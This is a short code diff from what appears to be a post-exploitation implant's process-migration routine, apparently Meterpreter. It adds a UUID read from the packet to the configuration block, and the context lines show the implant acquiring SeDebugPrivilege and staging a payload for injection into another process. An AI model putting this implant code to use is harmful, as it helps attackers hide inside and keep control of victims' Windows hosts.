@@ -484,8 +484,8 @@ BOOL remote_request_core_migrate(Remote * remote, Packet * packet, DWORD* pResul
 	BYTE * lpPayloadBuffer = NULL;
 	LPVOID lpMigrateStub = NULL;
 	LPBYTE lpMemory = NULL;
-	LPCOMMONMIGRATECONTEXT ctx = NULL;
-	DWORD ctxSize = 0;
+	LPBYTE lpUuid = NULL;
+	MIGRATECONTEXT ctx = { 0 };
 	DWORD dwMigrateStubLength = 0;
 	DWORD dwPayloadLength = 0;
 	DWORD dwProcessID = 0;
@@ -519,7 +519,9 @@ BOOL remote_request_core_migrate(Remote * remote, Packet * packet, DWORD* pResul
 		dwMigrateStubLength = packet_get_tlv_value_uint(packet, TLV_TYPE_MIGRATE_STUB_LEN);
 		lpMigrateStub = packet_get_tlv_value_raw(packet, TLV_TYPE_MIGRATE_STUB);
 
-		dprintf("[MIGRATE] Attempting to migrate. ProcessID=%d, Arch=%s, StubLength=%d, PayloadLength=%d", dwProcessID, (dwDestinationArch == 2 ? "x64" : "x86"), dwMigrateStubLength, dwPayloadLength);
+		lpUuid = packet_get_tlv_value_raw(packet, TLV_TYPE_UUID);
+
+		dprintf("[MIGRATE] Attempting to migrate. ProcessID=%d, Arch=%s, PayloadLength=%d", dwProcessID, (dwDestinationArch == 2 ? "x64" : "x86"), dwPayloadLength);
 
 		// If we can, get SeDebugPrivilege...
 		if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
@@ -549,7 +551,7 @@ BOOL remote_request_core_migrate(Remote * remote, Packet * packet, DWORD* pResul
 
 		// get the existing configuration
 		dprintf("[MIGRATE] creating the configuration block");
-		remote->config_create(remote, &config, &configSize);
+		remote->config_create(remote, lpUuid, &config, &configSize);
 		dprintf("[MIGRATE] Config of %u bytes stashed at 0x%p", configSize, config);
 
 		// get a transport-specific context if required, otherwise fallback on the default
